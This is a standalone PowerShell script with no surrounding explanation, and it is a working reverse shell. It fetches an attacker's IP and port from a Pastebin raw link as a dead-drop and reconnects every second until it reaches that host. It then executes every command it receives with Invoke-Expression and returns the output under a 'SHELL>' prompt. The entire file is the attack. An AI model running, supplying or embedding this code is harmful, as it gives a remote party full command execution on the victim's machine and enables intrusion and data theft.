$PastebinRawUrl = "https://pastebin.com/raw/Q2H3zKEK"
$PastebinContent = Invoke-RestMethod -Uri $PastebinRawUrl
$IPAddress, $Port = $PastebinContent -split ':'

do {
    Start-Sleep -Seconds 1
    try {
        $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, [int]$Port)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true

[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

function WriteToStream ($String) {
    $StreamWriter.Write($String + "`nSHELL> ")
    $StreamWriter.Flush()
}

WriteToStream "Connected"

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim()
    if ($Command -eq "exit") { break }
    
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    WriteToStream $Output
}

$StreamWriter.Close()
$TCPClient.Close()
